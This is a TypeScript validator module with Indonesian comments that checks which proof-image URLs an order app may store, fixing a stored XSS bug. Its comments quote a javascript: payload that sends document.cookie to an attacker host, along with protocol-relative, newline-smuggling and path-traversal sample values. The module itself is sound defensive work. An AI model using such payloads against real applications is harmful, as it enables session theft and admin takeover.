// src/lib/url-bukti.ts
//
// Satu tempat yang memutuskan apakah sebuah teks layak ditulis ke kolom URL
// gambar — `designFileUrl`, `refundProof`, `installationProof`.
//
// MENGAPA INI PENTING
// -------------------
// Ketiga kolom itu berakhir di atribut `src` dan `href` di layar admin dan
// dashboard pembeli. Sebelum modul ini ada, `submit-design/route.ts` menulis
// `designUrl` dari body permintaan apa adanya: tanpa pemeriksaan tipe, tanpa
// pemeriksaan skema. Pembeli bisa mengirim
// `javascript:fetch('https://penyerang/?c='+document.cookie)` untuk pesanannya
// sendiri, lalu admin yang menekan "Download Desain" menjalankannya di origin
// aplikasi dengan sesi admin — naik hak dari USER ke ADMIN.
//
// MENGAPA JALUR RELATIF IKUT DITERIMA
// -----------------------------------
// `api/upload/route.ts` dan `api/upload/design/route.ts` mengembalikan jalur
// ROOT-RELATIF (`/uploads/designs/{uuid}.{ext}`), sementara mode Cloudinary di
// `components/ImageUpload.tsx` mengembalikan `secure_url` absolut. Validator
// versi lama di `update-order/route.ts` memakai `new URL(teks)` tanpa base —
// yang MELEMPAR pada jalur relatif dan mengembalikan `null`. Akibatnya bukti
// refund dan bukti pemasangan yang diunggah lewat mode lokal dibuang diam-diam:
// admin melihat "Update Sukses", kolomnya tetap kosong. Modul ini menerima
// kedua bentuk supaya perbaikan XSS tidak sekaligus mematikan unggahan lokal.
//
// Jalur relatif sengaja dibatasi pada direktori unggahan yang memang ditulis
// aplikasi ini. Tanpa batas itu, `/admin/users` atau `/api/...` ikut lolos, dan
// nilai seperti itu hanya membuat gambar rusak sambil menyamarkan asalnya.

/** Panjang maksimum yang disimpan. Kolomnya `String` tanpa batas di Postgres. */
export const BATAS_PANJANG_URL = 2000;

/**
 * Awalan jalur relatif yang diakui sebagai hasil unggahan aplikasi ini.
 *
 * Harus sejalan dengan `NextResponse.json({ url: ... })` di
 * `api/upload/route.ts` dan `api/upload/design/route.ts`.
 */
export const AWALAN_UNGGAHAN = ['/uploads/'] as const;

/** Skema absolut yang boleh masuk ke `src`/`href`. */
const SKEMA_SAH = ['http:', 'https:'];

/**
 * Menormalkan nilai apa pun menjadi teks rapi, atau `null` bila tidak layak.
 *
 * Bukan hanya kenyamanan: body JSON bisa membawa angka, objek, atau `null`, dan
 * nilai selain teks yang diteruskan ke Prisma gagal di lapisan paling dalam
 * sebagai galat yang tidak menjelaskan apa pun ke pemakai.
 */
function teksRapi(nilai: unknown, batas: number): string | null {
  if (typeof nilai !== 'string') return null;
  const rapi = nilai.trim();
  return rapi === '' ? null : rapi.slice(0, batas);
}

/**
 * Mengembalikan URL yang layak disimpan, atau `null` bila nilainya ditolak.
 *
 * Diterima:
 *   - URL absolut ber-skema `http:` atau `https:`
 *   - jalur root-relatif di bawah `/uploads/`
 *
 * Ditolak — termasuk, dan terutama:
 *   - `javascript:`, `data:`, `vbscript:`, `file:`, skema apa pun selain dua di atas
 *   - `//penyerang.test/x` (protocol-relative: dibaca browser sebagai host lain)
 *   - jalur relatif di luar `/uploads/`
 *   - nilai yang mengandung karakter kendali (`\n`, `\t`, NUL) — pembawa
 *     penyelundupan header dan pemecah atribut HTML
 *   - nilai bukan teks, kosong, atau hanya spasi
 */
export function urlBuktiSah(nilai: unknown): string | null {
  const teks = teksRapi(nilai, BATAS_PANJANG_URL);
  if (!teks) return null;

  // Karakter kendali diperiksa lebih dulu: `new URL()` MEMBUANG beberapa di
  // antaranya secara diam-diam (tab dan baris baru dihapus sesuai spesifikasi
  // WHATWG), sehingga `javascript\n:alert(1)` bisa lolos sebagai URL sah
  // sementara teks yang kita simpan tetap yang asli.
  // eslint-disable-next-line no-control-regex
  if (/[\u0000-\u001F\u007F]/.test(teks)) return null;

  // Jalur unggahan lokal. Diperiksa sebelum `new URL()` karena `new URL()`
  // tanpa base selalu melempar untuk bentuk ini.
  if (teks.startsWith('/')) {
    // `//host` bukan jalur relatif: browser membacanya sebagai URL dengan host
    // lain dan skema halaman berjalan.
    if (teks.startsWith('//')) return null;
    // `/uploads/../../etc/passwd` tetap diawali `/uploads/`. Yang menyimpannya
    // tidak dirugikan, tetapi nilainya bukan hasil unggahan aplikasi ini.
    if (teks.includes('..')) return null;
    return AWALAN_UNGGAHAN.some((awalan) => teks.startsWith(awalan)) ? teks : null;
  }

  try {
    const url = new URL(teks);
    return SKEMA_SAH.includes(url.protocol) ? teks : null;
  } catch {
    return null;
  }
}
